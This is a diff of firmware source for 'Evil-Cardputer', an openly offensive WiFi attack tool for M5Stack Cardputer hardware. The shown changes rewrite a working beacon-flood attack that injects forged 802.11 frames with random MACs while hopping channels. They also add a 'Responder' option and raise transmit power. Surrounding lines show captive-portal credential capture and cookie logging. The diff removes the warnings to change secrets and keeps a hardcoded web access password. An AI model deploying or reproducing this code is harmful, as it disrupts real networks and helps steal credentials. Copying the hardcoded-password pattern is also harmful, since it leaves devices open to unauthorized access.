@@ -1,5 +1,5 @@
 /*
-   Evil-M5Core2 - WiFi Network Testing and Exploration Tool
+   Evil-Cardputer - WiFi Network Testing and Exploration Tool
 
    Copyright (c) 2025 7h30th3r0n3
 
@@ -22,13 +22,12 @@
    SOFTWARE.
 
    Disclaimer:
-   This tool, Evil-M5Core2, is developed for educational and ethical testing purposes only.
-   Any misuse or illegal use of this tool is strictly prohibited. The creator of Evil-M5Core2
+   This tool, Evil-Cardputer, is developed for educational and ethical testing purposes only.
+   Any misuse or illegal use of this tool is strictly prohibited. The creator of Evil-Cardputer
    assumes no liability and is not responsible for any misuse or damage caused by this tool.
    Users are required to comply with all applicable laws and regulations in their jurisdiction
    regarding network testing and ethical hacking.
 */
-// remember to change hardcoded password and configuration below in the code to ensure no unauthorized access : !!!!!! CHANGE THIS !!!!!
 
 #include <WiFi.h>
 #include <WebServer.h>
@@ -82,14 +81,12 @@ String scanIp = "";
 #include "libssh_esp32.h"
 #include <libssh/libssh.h>
 
-//!!!!!! CHANGE THIS !!!!!
-//!!!!!! CHANGE THIS !!!!!
+
 String ssh_user = "";
 String ssh_host = "";
 String ssh_password = "";
 int ssh_port = 22;
-//!!!!!! CHANGE THIS !!!!!
-//!!!!!! CHANGE THIS !!!!!
+
 
 // SSH session and channel
 ssh_session my_ssh_session;
@@ -104,7 +101,7 @@ extern "C" {
 #include "esp_system.h"
 }
 
-bool ledOn = true;// change this to true to get cool led effect (only on fire)
+bool ledOn = true;
 bool soundOn = true;
 bool randomOn = false;
 
@@ -179,6 +176,7 @@ const char* menuItems[] = {
     "LLM Chat Stream",
     "EvilChatMesh",
     "SD on USB",
+    "Responder",
     "Settings"
 };
 
@@ -196,25 +194,14 @@ String clonedSSID = "Evil-Cardputer";
 int topVisibleIndex = 0;
 
 // Connect to nearby wifi network automaticaly to provide internet to the cardputer you can be connected and provide AP at same time
-//!!!!!! CHANGE THIS !!!!!
-//!!!!!! CHANGE THIS !!!!!
 String ssid = "";
 String password = "";
 
+// password for web access to remote check captured credentials and send new html file
+String accessWebPassword = "7h30th3r0n3"; 
 
-
-//!!!!!! CHANGE THIS !!!!!
-//!!!!!! CHANGE THIS !!!!!
-// password for web access to remote check captured credentials and send new html file !!!!!! CHANGE THIS !!!!!
-String accessWebPassword = "7h30th3r0n3"; // !!!!!! CHANGE THIS !!!!!
-//!!!!!! CHANGE THIS !!!!!
-//!!!!!! CHANGE THIS !!!!!
-
-
-
-
-char ssid_buffer[32] = "";//!!!!!! NOT THIS !!!!!
-char password_buffer[64] = ""; //!!!!!! NOT THIS !!!!!
+char ssid_buffer[32] = "";
+char password_buffer[64] = ""; 
 
 String portalFiles[50]; // 30 portals max
 int numPortalFiles = 0;
@@ -985,7 +972,7 @@ void setup() {
   // Textes à afficher
   const char* text1 = "Evil-Cardputer";
   const char* text2 = "By 7h30th3r0n3";
-  const char* text3 = "v1.4.0 2025";
+  const char* text3 = "v1.4.1 2025";
 
   // Mesure de la largeur du texte et calcul de la position du curseur
   int text1Width = M5.Lcd.textWidth(text1);
@@ -1015,7 +1002,7 @@ void setup() {
   Serial.println("-------------------");
   Serial.println("Evil-Cardputer");
   Serial.println("By 7h30th3r0n3");
-  Serial.println("v1.4.0 2025");
+  Serial.println("v1.4.1 2025");
   Serial.println("-------------------");
   // Diviser randomMessage en deux lignes pour s'adapter à l'écran
   int maxCharsPerLine = screenWidth / 10;  // Estimation de 10 pixels par caractère
@@ -1109,6 +1096,7 @@ void setup() {
 
   auto cfg = M5.config();
   M5Cardputer.begin(cfg, true);
+  esp_wifi_set_max_tx_power(84);
   drawMenu();
 }
 
@@ -1432,7 +1420,8 @@ void executeMenuItem(int index) {
     case 56: evilLLMChatStream(); break;
     case 57: EvilChatMesh(); break;
     case 58: sdToUsb(); break;
-    case 59: showSettingsMenu(); break;
+    case 59: responder(); break;    
+    case 60: showSettingsMenu(); break;
   }
   isOperationInProgress = false;
 }
@@ -2257,7 +2246,7 @@ void handleLogRequest() {
   }
 
   // Affichage debug sur le port série
-  Serial.println("Cookies reçus via /log :");
+  Serial.println("Cookies receiveds via /log :");
   Serial.println("  Domain : " + paramDomain);
   Serial.println("  Cookies: " + cookies);
   Serial.println("----------------------");
@@ -2502,7 +2491,7 @@ void createCaptivePortal() {
       String newPassword = server.arg("newPassword");
       int portalIndex = server.arg("portalIndex").toInt();  // Récupérer l'indice du fichier sélectionné
   
-      // Logs pour vérifier l'indice reçu
+      // Logs pour vérifier l'indice received
       Serial.println("Updating portal settings...");
       Serial.println("New SSID: " + newSSID);
       Serial.println("New Password: " + newPassword);
@@ -5326,7 +5315,7 @@ void startAPWithSSIDKarma(const char* ssid) {
     M5.Display.setCursor(10, 45);
     M5.Display.print("Left Time: ");
     M5.Display.print(remainingTime);
-    M5.Display.println(" s");
+    M5.Display.println(" s ");
 
     M5.Display.setCursor(10, 65);
     M5.Display.print("Connected Client: ");
@@ -6019,12 +6008,21 @@ bool readConfigFile(const char* filename) {
   return true;
 }
 
+
 bool isSSIDWhitelisted(const char* ssid) {
+  std::string ssidStr(ssid);
+
   for (const auto& wssid : whitelist) {
-    if (wssid == ssid) {
+    // Convertit le pattern avec * en regex
+    std::string pattern = std::regex_replace(wssid, std::regex(R"([\.\^\$\+\?\(\)\[\]\{\}\\\|])"), R"(\$&)"); // échappe les caractères spéciaux
+    pattern = std::regex_replace(pattern, std::regex(R"(\*)"), ".*"); // remplace * par .*
+    std::regex regexPattern("^" + pattern + "$", std::regex_constants::icase); // match exact insensible à la casse
+
+    if (std::regex_match(ssidStr, regexPattern)) {
       return true;
     }
   }
+
   return false;
 }
 
@@ -6286,7 +6284,7 @@ void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPD
   M5.Display.setTextColor(menuTextUnFocusedColor);
   M5.Display.setCursor(timeValuePosX, timeValuePosY);
   M5.Display.print(remainingTime);
-  M5.Display.print(" s ");
+  M5.Display.print(" s  ");
 
   int clientValuePosX = M5.Display.textWidth("Connected Client: ");
   int clientValuePosY = 50;
@@ -6301,9 +6299,9 @@ void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPD
 
 String createPreHeader() {
   String preHeader = "WigleWifi-1.4";
-  preHeader += ",appRelease=v1.4.0"; // Remplacez [version] par la version de votre application
+  preHeader += ",appRelease=v1.4.1"; // Remplacez [version] par la version de votre application
   preHeader += ",model=Cardputer";
-  preHeader += ",release=v1.4.0"; // Remplacez [release] par la version de l'OS de l'appareil
+  preHeader += ",release=v1.4.1"; // Remplacez [release] par la version de l'OS de l'appareil
   preHeader += ",device=Evil-Cardputer"; // Remplacez [device name] par un nom de périphérique, si souhaité
   preHeader += ",display=7h30th3r0n3"; // Ajoutez les caractéristiques d'affichage, si pertinent
   preHeader += ",board=M5Cardputer";
@@ -6618,35 +6616,71 @@ void karmaSpear() {
 }
 
 
-// beacon attack
 
-static uint16_t sequenceNumber = 0; 
+// beacon spam
 
-std::vector<String> readCustomBeacons(const char* filename) {
+static uint16_t sequenceNumber = 0;
+
+// taille totale du paquet (header 24 + 8 + 2 + 2 + IE 2+32 + 2+8 + 3 + 6)
+const size_t BEACON_PACKET_SIZE = 89; // octets réellement envoyés
+
+uint8_t beaconPacket[96] = {
+    /*  0 */ 0x80, 0x00,               // Frame Control : Beacon
+    /*  2 */ 0x00, 0x00,               // Duration
+
+    /*  4 – 9  */ 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination : broadcast
+    /* 10 – 15 */ 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, // Source MAC (ajoutée dynamiquement)
+    /* 16 – 21 */ 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (idem)
+    /* 22 – 23 */ 0x00, 0x00,               // Sequence Control
+
+    /* 24 – 31 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
+
+    /* 32 – 33 */ 0x64, 0x00,             // Beacon interval : 100 TU
+    /* 34 – 35 */ 0x21, 0x04,             // Capabilities : ESS | Short Preamble | Short Slot
+
+    // ---- IE SSID (Type 0, Len 32) ----
+    /* 36 */ 0x00, 0x20,
+    /* 38 – 69 */
+    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
+    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
+    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
+    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
+
+    // ---- IE Supported Rates (Type 1, Len 8) ----
+    /* 70 */ 0x01, 0x08,
+    /* 72 – 79 */ 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
+
+    // ---- IE DS Param Set (Type 3, Len 1) ----
+    /* 80 – 82 */ 0x03, 0x01, 0x01, // canal modifié dynamiquement
+
+    // ---- IE TIM minimal (Type 5, Len 4) ----
+    /* 83 – 88 */ 0x05, 0x04, 0x00, 0x01, 0x00, 0x00
+};
+
+// Sélection des canaux (1–13)
+const uint8_t channels[] = {1,2,3,6,9,11,13};
+uint8_t channelIndex = 0;
+uint8_t wifi_channel = 1;
+
+// -------------------- Utilitaires -----------------
+
+std::vector<String> readCustomBeacons(const char* filename){
     std::vector<String> customBeacons;
     File file = SD.open(filename, FILE_READ);
-
-    if (!file) {
+    if(!file){
         Serial.println("Failed to open file for reading");
         return customBeacons;
     }
-
-    while (file.available()) {
+    while(file.available()){
         String line = file.readStringUntil('\n');
-        line.trim();  // Enlever les espaces inutiles en fin de ligne
-
-        if (line.startsWith("CustomBeacons=")) {
+        line.trim();
+        if(line.startsWith("CustomBeacons=")){
             String beaconsStr = line.substring(String("CustomBeacons=").length());
-
-            while (beaconsStr.length() > 0) {
+            while(beaconsStr.length()>0){
                 int idx = beaconsStr.indexOf(',');
-                if (idx == -1) {
-                    customBeacons.push_back(beaconsStr);
-                    break;
-                } else {
-                    customBeacons.push_back(beaconsStr.substring(0, idx));
-                    beaconsStr = beaconsStr.substring(idx + 1);
-                }
+                if(idx==-1){ customBeacons.push_back(beaconsStr); break; }
+                customBeacons.push_back(beaconsStr.substring(0,idx));
+                beaconsStr = beaconsStr.substring(idx+1);
             }
             break;
         }
@@ -6655,176 +6689,139 @@ std::vector<String> readCustomBeacons(const char* filename) {
     return customBeacons;
 }
 
-char randomName[32];
-char *randomSSID() {
-    const char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
-    int len = random(8, 33);  // Génère une longueur entre 8 et 32
-    for (int i = 0; i < len; ++i) {
-        randomName[i] = charset[random() % strlen(charset)];
-    }
-    randomName[len] = '\0';  // Terminer par un caractère nul
-    return randomName;
-}
-
-char emptySSID[32];
-uint8_t beaconPacket[86] = {
-    0x80, 0x00, // [0-1] Frame Control: Beacon frame
-    0x00, 0x00, // [2-3] Duration: 0
-
-    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // [4-9] Destination: broadcast
-    0x02, 0x00, 0x00, 0x00, 0x00, 0x00, // [10-15] Source MAC (remplacé dynamiquement)
-    0x02, 0x00, 0x00, 0x00, 0x00, 0x00, // [16-21] BSSID (remplacé dynamiquement)
-    0x00, 0x00,                         // [22-23] Sequence Control (modifié dynamiquement)
-
-    0x00, 0x00, 0x00, 0x00,             // [24-27] Timestamp (modifié dynamiquement)
-    0x00, 0x00, 0x00, 0x00,             // [28-31] Timestamp (suite)
-
-    0x64, 0x00,                         // [32-33] Beacon interval: 100 TU (102.4ms)
-    0x21, 0x04,                         // [34-35] Capabilities: ESS, Short Preamble, Short Slot
-
-    0x00, 0x20,                         // [36-37] SSID Tag: Type = 0, Length = 32 (modifié dynamiquement)
-    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // [38-45] SSID (espaces par défaut)
-    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // [46-53]
-    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // [54-61]
-    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // [62-69]
-
-    0x01, 0x08,                         // [70-71] Supported Rates Tag: Type = 1, Length = 8
-    0x82, 0x84, 0x8b, 0x96,             // [72-75] Rates: 1, 2, 5.5, 11 Mbps (basic rates)
-    0x24, 0x30, 0x48, 0x6c,             // [76-79] Rates: 18, 24, 36, 54 Mbps
-
-    0x03, 0x01, 0x01                    // [80-82] DS Parameter Set: Type = 3, Length = 1, Channel = 1 (modifié dynamiquement)
-};
-
-const uint8_t channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13};
-uint8_t channelIndex = 0;
-uint8_t wifi_channel = 1;
-
-void nextChannel() {
-    if (sizeof(channels) / sizeof(channels[0]) > 1) {
+void nextChannel(){
+    if(sizeof(channels)/sizeof(channels[0])>1){
         wifi_channel = channels[channelIndex];
-        channelIndex = (channelIndex + 1) % (sizeof(channels) / sizeof(channels[0]));
+        channelIndex = (channelIndex+1)% (sizeof(channels)/sizeof(channels[0]));
         esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
     }
 }
 
-void generateRandomWiFiMac(uint8_t *mac) {
-    mac[0] = 0x02;
-    for (int i = 1; i < 6; i++) {
-        mac[i] = random(0, 255);
-    }
+void generateRandomWiFiMac(uint8_t *mac){
+    mac[0] = 0x02; // Locally administered, unicast
+    for(int i=1;i<6;i++) mac[i] = random(0,255);
 }
 
-void beaconSpamList(const char *list, size_t listSize, const uint8_t* macAddr) {
-    int i = 0;
-    Serial.println("Starting beaconSpamList...");
+char randomName[32];
+char* randomSSID(){
+    const char *charset="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-!@#$%^&*()[]{}<>+=.,?;:'\"|/~`\\";
+    int len = random(8,33);
+    for(int i=0;i<len;++i) randomName[i]=charset[random() % strlen(charset)];
+    randomName[len]='\0';
+    return randomName;
+}
 
-    if (listSize == 0) {
-        Serial.println("Empty list provided. Exiting beaconSpamList.");
-        return;
-    }
+// -------------------- Construction du paquet -----------------
 
-    nextChannel();
+void setSSID(const char* ssid, uint8_t len){
+    // IE SSID commence à l'offset 38, longueur fixée à 32 octets
+    memset(&beaconPacket[38], 0x20, 32);   // pad avec des espaces (0x20)
+    memcpy(&beaconPacket[38], ssid, len);
+    // longueur déclarée reste 32 -> beaconPacket[37] déjà à 0x20
+}
 
-    while (i < listSize) {
-        int j = 0;
-        while (list[i + j] != '\n' && j < 32 && i + j < listSize) j++;
-        uint8_t ssidLen = j;
-        if (ssidLen > 32) { i += j; continue; }
+void prepareBeacon(const char* ssid, uint8_t len, const uint8_t* mac){
+    // MAC source + BSSID
+    memcpy(&beaconPacket[10], mac, 6);
+    memcpy(&beaconPacket[16], mac, 6);
 
-        memcpy(&beaconPacket[10], macAddr, 6); // Source MAC
-        memcpy(&beaconPacket[16], macAddr, 6); // BSSID
+    // Timestamp
+    uint64_t ts = esp_timer_get_time();
+    memcpy(&beaconPacket[24], &ts, sizeof(ts));
 
-        memset(&beaconPacket[38], 0x20, 32);
-        memcpy(&beaconPacket[38], &list[i], ssidLen);
-        beaconPacket[37] = ssidLen;
+    // Numéro de séquence (4 bits fragment = 0)
+    sequenceNumber = (sequenceNumber + 0x10) & 0xFFF0;
+    beaconPacket[22] = sequenceNumber & 0xFF;
+    beaconPacket[23] = (sequenceNumber >> 8) & 0xFF;
 
-        // DS Parameter Set juste après SSID
-        uint8_t dsPos = 38 + ssidLen;
-        beaconPacket[dsPos]     = 0x03;
-        beaconPacket[dsPos + 1] = 0x01;
-        beaconPacket[dsPos + 2] = wifi_channel;
+    // Canal (byte 82)
+    beaconPacket[82] = wifi_channel;
 
-        size_t beaconPacketSize = 38 + ssidLen + 9 + 3;
+    // SSID
+    setSSID(ssid, len);
+}
 
-        for (int k = 0; k < 3; k++) {
-            uint64_t timestamp = esp_timer_get_time();
-            memcpy(&beaconPacket[24], &timestamp, sizeof(timestamp));
+void beaconSpamList(const char* list, size_t listSize){
+    if(listSize==0){ Serial.println("Empty list provided."); return; }
+    int idx=0; uint16_t burst=0;
+    nextChannel(); // canal initial
 
-            sequenceNumber = (sequenceNumber + 0x10) & 0xFFF0;
-            beaconPacket[22] = sequenceNumber & 0xFF;
-            beaconPacket[23] = (sequenceNumber >> 8) & 0xFF;
+    while(idx < listSize){
+        // extraction d'une ligne (\n => séparateur), max 32 car.
+        uint8_t len=0; while(idx+len<listSize && list[idx+len]!='\n' && len<32) len++;
+        if(len==0){ idx++; continue; }
 
-            esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, beaconPacketSize, false);
+        char ssid[33]="\0"; memcpy(ssid, &list[idx], len); ssid[len]='\0';
+        uint8_t mac[6]; generateRandomWiFiMac(mac);
+
+        prepareBeacon(ssid, len, mac);
+
+        // envoyer 3 fois
+        for(int k=0;k<3;k++){
+            esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, BEACON_PACKET_SIZE, false);
             delay(1);
+            burst++;
         }
-        i += j;
-        if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) break;
+
+        // ralentir + channel hop
+        if(burst % 9 == 0){
+            delay(80); // laisse le temps aux scans Windows
+            nextChannel();
+        }
+
+        // touche arrêt
+        if(M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) break;
+        idx += len;
+        // sauter le "\n" éventuel
+        if(idx < listSize && list[idx]=='\n') idx++;
     }
-    Serial.println("Finished beaconSpamList.");
 }
 
-void beaconAttack() {
+// -------------------- Attaque principale -----------------
+
+void beaconAttack(){
     WiFi.mode(WIFI_MODE_STA);
 
     bool useCustomBeacons = confirmPopup("Use custom beacons?");
     M5.Display.clear();
 
     std::vector<String> customBeacons;
-    if (useCustomBeacons) {
-        customBeacons = readCustomBeacons("/config/config.txt");
-    }
+    if(useCustomBeacons) customBeacons = readCustomBeacons("/config/config.txt");
 
-    int beaconCount = 0;
-    unsigned long previousMillis = 0;
-    int delayTimeBeacon = 0;
-    const int debounceDelay = 0;
-    unsigned long lastDebounceTime = 0;
+    unsigned long previousMillis=0; // tempo personnalisée si besoin
 
-    M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 30, TFT_RED);
-    M5.Display.setCursor(M5.Display.width() / 2 - 24, M5.Display.height() - 20);
-    M5.Display.setTextColor(TFT_WHITE);
-    M5.Display.println("Stop");
+    // UI "Stop" en bas
+    M5.Display.fillRect(0, M5.Display.height()-30, M5.Display.width(), 30, TFT_RED);
+    M5.Display.setCursor(M5.Display.width()/2-24, M5.Display.height()-20);
+    M5.Display.setTextColor(TFT_WHITE); M5.Display.println("Stop");
 
-    M5.Display.setCursor(10, 18);
-    M5.Display.println("Beacon Spam running..");
-    Serial.println("-------------------");
-    Serial.println("Starting Beacon Spam");
-    Serial.println("-------------------");
+    M5.Display.setCursor(10,18); M5.Display.println("Beacon Spam running..");
+    Serial.println("-------------------\nStarting Beacon Spam\n-------------------");
 
-    while (!M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && !M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
-        unsigned long currentMillis = millis();
-        if (currentMillis - previousMillis >= delayTimeBeacon) {
-            previousMillis = currentMillis;
-
-            if (useCustomBeacons && !customBeacons.empty()) {
-              for (const auto& ssid : customBeacons) {
-                  uint8_t macAddr[6];
-                  generateRandomWiFiMac(macAddr);  // une MAC unique pour ce SSID
-                  beaconSpamList(ssid.c_str(), ssid.length(), macAddr);
-              }
-            } else {
-                  char *randomSSIDName = randomSSID();
-                  uint8_t macAddr[6];
-                  generateRandomWiFiMac(macAddr);
-                  beaconSpamList(randomSSIDName, strlen(randomSSIDName), macAddr);
+    while(!M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) &&
+          !M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE))
+    {
+        // cadence principale ~ sans délai -> dépend du hop
+        if(useCustomBeacons && !customBeacons.empty()){
+            for(const auto& s: customBeacons){
+                beaconSpamList(s.c_str(), s.length());
+                if(M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) break;
             }
-            beaconCount++;
+        } else {
+            char *randSsid = randomSSID();
+            beaconSpamList(randSsid, strlen(randSsid));
         }
 
-        M5.update();
-        M5Cardputer.update();
-        if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && currentMillis - lastDebounceTime > debounceDelay) {
-            break;
-        }
+        M5.update(); M5Cardputer.update();
         delay(10);
     }
-    Serial.println("-------------------");
-    Serial.println("Stopping beacon Spam");
-    Serial.println("-------------------");
+
+    Serial.println("-------------------\nStopping Beacon Spam\n-------------------");
     restoreOriginalWiFiSettings();
     waitAndReturnToMenu("Beacon Spam Stopped..");
 }
 
+// beacon spam end
 
 // Set wifi and password ssid
 
@@ -7079,11 +7076,7 @@ void setDeviceMacAddress(String mac) {
 
 
 
-// Set wifi and password ssid end
-
-
-
-
+// Set wifi password mac ssid end
 
 
 
@@ -7376,6 +7369,7 @@ void deauthDetect() {
 
   waitAndReturnToMenu("Stop detection...");
 }
+
 
 
 // sniff pcap
@@ -8387,7 +8381,7 @@ void navigatePcapList(bool next) {
 
 
 // Wof part // from a really cool idea of Kiyomi // https://github.com/K3YOMI/Wall-of-Flippers
-unsigned long lastFlipperFoundMillis = 0; // Pour stocker le moment de la dernière annonce reçue
+unsigned long lastFlipperFoundMillis = 0; // Pour stocker le moment de la dernière annonce receivede
 static bool isBLEInitialized = false;
 
 struct ForbiddenPacket {
@@ -10737,7 +10731,7 @@ int totalNetworks = 0;
 unsigned long lastLog = 0;
 int currentScreen = 1;  // Track which screen is currently displayed
 
-const String wigleHeaderFileFormat = "WigleWifi-1.4,appRelease=v1.4.0,model=Cardputer,release=v1.4.0,device=Evil-Cardputer,display=7h30th3r0n3,board=M5Cardputer,brand=M5Stack";
+const String wigleHeaderFileFormat = "WigleWifi-1.4,appRelease=v1.4.1,model=Cardputer,release=v1.4.1,device=Evil-Cardputer,display=7h30th3r0n3,board=M5Cardputer,brand=M5Stack";
 
 char* log_col_names[LOG_COLUMN_COUNT] = {
     "MAC", "SSID", "AuthMode", "FirstSeen", "Channel", "RSSI", "CurrentLatitude", "CurrentLongitude", "AltitudeMeters", "AccuracyMeters", "Type"
@@ -11150,11 +11144,11 @@ void OnDataRecvSniffer(const uint8_t *mac, const uint8_t *incomingData, int len)
     }
 }
 
-int lastTotalReceived = -1;  // Stocke l'ancien total des trames reçues
+int lastTotalReceived = -1;  // Stocke l'ancien total des trames receivedes
 int lastReceivedFrames[14] = {0};  // Stocke les anciennes valeurs pour chaque boardID
 
 void displayStatus() {
-    // Calculer le total des trames reçues
+    // Calculer le total des trames receivedes
     int totalReceived = 0;
     for (int i = 0; i < 14; i++) {
         totalReceived += received_frames[i];
@@ -11177,7 +11171,7 @@ void displayStatus() {
 
     M5.Display.setTextSize(1);  // Taille de texte des cases
     for (int i = 0; i < 14; i++) {
-        if (received_frames[i] != lastReceivedFrames[i]) {  // Seulement si les trames reçues ont changé
+        if (received_frames[i] != lastReceivedFrames[i]) {  // Seulement si les trames receivedes ont changé
             int col = i % 2;  // Colonne (0 ou 1)
             int row = i / 2;  // Ligne (0 à 6)
 
@@ -14444,7 +14438,7 @@ bool sendSNMPRequest(IPAddress printerIP, const char* oid, String& response) {
             uint8_t buffer[255];
             udp.read(buffer, sizeof(buffer));
     
-            /*// Debug : afficher le paquet reçu
+            /*// Debug : afficher le paquet received
             Serial.println("[DEBUG] Received SNMP Response:");
             for (int i = 0; i < packetSize; i++) {
                 Serial.printf("%02X ", buffer[i]);
@@ -16068,7 +16062,7 @@ void evilLLMChatStream() {
         return;
       }
 
-      // Timeout si aucun token reçu
+      // Timeout si aucun token received
       if (!gotFirstToken && millis() - streamStart > 10000) {
         client.stop();
         waitAndReturnToMenu("LLM not responding (timeout)");
@@ -16216,14 +16210,10 @@ void evilLLMChatStream() {
 
 
 
-
-
-
-
-
 #define MAX_MSG_LEN 100
 #define MAX_HISTORY 32
-#define MAX_NODES 30
+#define MAX_NODES   30
+
 
 struct NodePresence {
     char nick[16];
@@ -16240,402 +16230,1463 @@ struct Message {
     char content[MAX_MSG_LEN];
 };
 
-// --- VARIABLES GLOBALES ---
-NodePresence nodesConnected[MAX_NODES];  // ok ici maintenant
-int nodesCount = 0;
+/* ---------- VARIABLES GLOBALES ---------- */
+NodePresence nodesConnected[MAX_NODES];
+int          nodesCount        = 0;
 
 char seenMessageIds[MAX_HISTORY][9];
-int seenIndex = 0;
-char inputBuffer[MAX_MSG_LEN] = "";
+int  seenIndex         = 0;
 
-uint8_t broadcastAddressEspNow[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+char inputBuffer[MAX_MSG_LEN]  = "";
+
+uint8_t broadcastAddressEspNow[] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
 
 Message messages[20];
-int messageCount = 0;
-int messageHead = 0;
+int     messageCount   = 0;
+int     messageHead    = 0;
 
-// Constants
-#define TIMEOUT_PRESENCE 2000  
-#define PING_INTERVAL 500      
-unsigned long lastPing = 0;
+/* Timings */
+#define TIMEOUT_PRESENCE 2000
+#define PING_INTERVAL     500
+unsigned long lastPing  = 0;
 
+/* ---------- NOUVEAU : BUFFER SÉCURISÉ POUR LE CALLBACK ---------- */
+volatile bool    newPacketPending = false;
+volatile uint8_t packetBuffer[sizeof(MeshMessage)+sizeof(uint16_t)];
+volatile int     packetLen        = 0;
 
-// ----- Hash pour déduplication -----
-void simpleHash(const char* s, char* outHash) {
-    uint32_t hash = 5381;
-    while (*s) {
-        hash = ((hash << 5) + hash) + (uint8_t)(*s++);
-    }
-    snprintf(outHash, 9, "%08X", hash);
-    outHash[8] = '\0';
+/* ---------- PROTOTYPES (déclarés ici pour la loop) ---------- */
+void handleIncomingPacket(const uint8_t* data, int len);
+void drawChatWindow();
+void broadcastPing();
+void updatePresence(const char* nick);
+
+/* ---------- CALLBACK ESP‑NOW ULTRA‑COURT ---------- */
+void IRAM_ATTR OnDataRecvChat(const uint8_t* mac,
+                              const uint8_t* incomingData, int len)
+{
+    if (len > sizeof(packetBuffer)) return;        // paquet trop gros
+    memcpy((void*)packetBuffer, incomingData, len);
+    packetLen        = len;
+    newPacketPending = true;                      // flag pour la loop()
 }
 
-// ----- CRC16 (CRC-CCITT) -----
-uint16_t crc16(const uint8_t* data, size_t length) {
+// ----- Hash pour dé‑duplication -----
+void simpleHash(const char* s, char* outHash) {
+    uint32_t h = 5381;
+    while (*s) h = ((h << 5) + h) + (uint8_t)(*s++);
+    snprintf(outHash, 9, "%08X", h);   // 8 hex, zéro‑terminé
+}
+
+// ----- CRC16 (CRC‑CCITT) -----
+uint16_t crc16(const uint8_t* data, size_t len) {
     uint16_t crc = 0xFFFF;
-    for (size_t i = 0; i < length; i++) {
-        crc ^= ((uint16_t)data[i] << 8);
-        for (int j = 0; j < 8; j++) {
-            crc = (crc & 0x8000) ? ((crc << 1) ^ 0x1021) : (crc << 1);
-        }
+    for (size_t i = 0; i < len; ++i) {
+        crc ^= (uint16_t)data[i] << 8;
+        for (int j = 0; j < 8; ++j)
+            crc = (crc & 0x8000) ? (crc << 1) ^ 0x1021 : (crc << 1);
     }
     return crc;
 }
 
-// ----- Gestion historique de messages -----
+// ----- Historique d’ID reçus -----
 bool hasSeenId(const char* id) {
-    for (int i = 0; i < MAX_HISTORY; i++) {
+    for (int i = 0; i < MAX_HISTORY; ++i)
         if (strncmp(seenMessageIds[i], id, 8) == 0) return true;
-    }
     return false;
 }
-
 void rememberId(const char* id) {
     strncpy(seenMessageIds[seenIndex], id, 8);
     seenMessageIds[seenIndex][8] = '\0';
     seenIndex = (seenIndex + 1) % MAX_HISTORY;
 }
 
-void addMessage(const char* msg) {
-    strncpy(messages[messageHead].content, msg, MAX_MSG_LEN);
+// ----- Buffer circulaire de messages pour l’écran -----
+void addMessage(const char* m) {
+    strncpy(messages[messageHead].content, m, MAX_MSG_LEN - 1);
     messages[messageHead].content[MAX_MSG_LEN - 1] = '\0';
     messageHead = (messageHead + 1) % 20;
     if (messageCount < 20) messageCount++;
 }
 
+// rafraîchit l’écran
 void drawChatWindow() {
     M5.Display.fillScreen(TFT_BLACK);
-    
-    // Affiche le nombre de personnes connectées
     M5.Display.setTextColor(TFT_GREEN);
     M5.Display.setCursor(0, 0);
     M5.Display.printf("Connected: %d", nodesCount);
-    
-    // Affiche les messages
+
     M5.Display.setTextColor(TFT_WHITE);
     M5.Display.setCursor(0, 10);
-    int linesToShow = 13;
-    int start = (messageCount < linesToShow) ? 0 : (messageHead + 20 - linesToShow) % 20;
-    for (int i = 0; i < min(linesToShow, messageCount); i++) {
-        int index = (start + i) % 20;
-        M5.Display.println(messages[index].content);
-    }
 
+    const int lines = 13;
+    int start = (messageCount < lines) ? 0 : (messageHead + 20 - lines) % 20;
+    for (int i = 0; i < min(lines, messageCount); ++i) {
+        int idx = (start + i) % 20;
+        M5.Display.println(messages[idx].content);
+    }
     M5.Display.display();
 }
 
-
-// ----- Commandes IRC -----
-void handleCommand(const char* input) {
-    if (strncmp(input, "/nick ", 6) == 0) {
-        strncpy(currentNick, input + 6, 15);
-        currentNick[15] = '\0';
-        char msg[MAX_MSG_LEN];
-        snprintf(msg, MAX_MSG_LEN, "Nickname set to: %s", currentNick);
-        addMessage(msg);
-        drawChatWindow();
-    } else if (strcmp(input, "/clear") == 0) {
-        messageCount = 0;
-        messageHead = 0;
-        drawChatWindow();
-    } else if (strncmp(input, "/me ", 4) == 0) {
-        char action[MAX_MSG_LEN];
-        snprintf(action, MAX_MSG_LEN, "* %s %s", currentNick, input + 4);
-
-        MeshMessage msg;
